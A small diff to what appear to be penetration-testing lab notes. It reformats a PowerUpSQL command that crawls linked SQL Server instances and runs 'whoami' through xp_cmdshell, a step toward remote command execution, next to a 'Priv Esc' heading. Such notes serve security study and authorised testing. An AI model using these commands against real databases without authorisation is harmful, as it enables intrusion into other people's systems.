@@ -122,7 +122,7 @@ Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
 
 If xp_cmdshell is enabled (or RPC out is true), command execution is possible via this command:
 
-Get-SQLServerLinkCrawl -Instance <FQDN-SQL-Server> -Query "exec master..xp_cmdshell 'whoami'"
+##### Get-SQLServerLinkCrawl -Instance <FQDN-SQL-Server> -Query "exec master..xp_cmdshell 'whoami'"
 
 # Priv Esc
 
